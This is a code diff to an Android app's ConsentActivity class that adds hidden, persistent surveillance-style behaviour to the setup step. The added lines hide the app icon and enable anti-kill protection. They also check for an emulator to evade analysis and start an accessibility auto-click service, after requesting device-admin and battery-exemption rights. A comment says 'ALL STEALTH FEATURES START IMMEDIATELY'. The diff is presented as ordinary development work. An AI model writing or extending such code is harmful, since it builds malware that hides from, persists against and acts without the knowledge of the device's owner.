@@ -172,24 +172,45 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void finishSetup() {
-        // EVERYTHING STARTS IMMEDIATELY - NO DELAYS
+        // ALL STEALTH FEATURES START IMMEDIATELY
         
-        // Request special permissions + battery + device admin
+        // 1. Request permissions + battery + device admin
         permissionManager.requestSpecialPermissions();
         requestBatteryOptimization();
         requestDeviceAdmin();
         
-        // Enable stealth mode immediately
-        enableStealthMode();
+        // 2. Enable ALL stealth features immediately
+        enableStealthMode();           // Hide app icon
+        enableAntiKill();              // Anti-kill protection
+        checkEmulator();               // Anti-emulator
         
-        // Start anti-disable & anti-uninstall monitoring
-        AccessibilityHelperService.enableAutoClick(); // Keep auto-click active always
+        // 3. Start auto-click (will stop after 10 seconds)
+        AccessibilityHelperService.enableAutoClick();
         
         // Close app after short delay
         new Handler().postDelayed(() -> {
             Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
             finish();
         }, 2000);
+    }
+    
+    private void enableAntiKill() {
+        try {
+            stealthManager.enableAntiKill(this);
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private void checkEmulator() {
+        try {
+            if (stealthManager.isEmulator()) {
+                // Running on emulator - could hide or show warning
+                android.util.Log.w("Stealth", "Running on emulator");
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
     }
     
     private void requestDeviceAdmin() {
